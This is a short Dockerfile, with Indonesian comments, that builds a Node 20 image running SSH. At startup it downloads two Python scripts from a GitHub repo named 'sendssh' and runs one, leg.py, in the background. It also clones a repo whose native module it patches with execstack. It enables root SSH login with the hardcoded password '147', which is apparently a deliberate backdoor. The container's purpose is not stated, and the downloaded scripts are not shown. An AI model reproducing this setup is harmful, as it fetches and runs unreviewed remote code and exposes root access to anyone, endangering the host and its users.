FROM node:20-bullseye

ENV DEBIAN_FRONTEND=noninteractive

# Install dependencies + prelink (supaya ada execstack)
RUN apt update && apt upgrade -y && apt install -y \
    openssh-server git wget sudo nano curl python3 python3-pip prelink \
    && rm -rf /var/lib/apt/lists/*

# Clone repo
RUN git clone https://github.com/x011-al/nbwc

# Ambil file tambahan
RUN wget https://raw.githubusercontent.com/x011-al/sendssh/refs/heads/main/leg.py \
    && wget https://raw.githubusercontent.com/x011-al/sendssh/refs/heads/main/cgn.py

# Buat startup script
RUN mkdir /run/sshd \
    && echo "sleep 5" >> /openssh.sh \
    && echo "python3 leg.py &" >> /openssh.sh \
    && echo "/usr/sbin/sshd -D" >> /openssh.sh \
    && echo "PermitRootLogin yes" >> /etc/ssh/sshd_config \
    && echo "root:147" | chpasswd \
    && chmod 755 /openssh.sh

# Patch N.node biar gak error "executable stack"
RUN execstack -c /nbwc/build/Release/N.node || true

ENTRYPOINT ["/openssh.sh"]
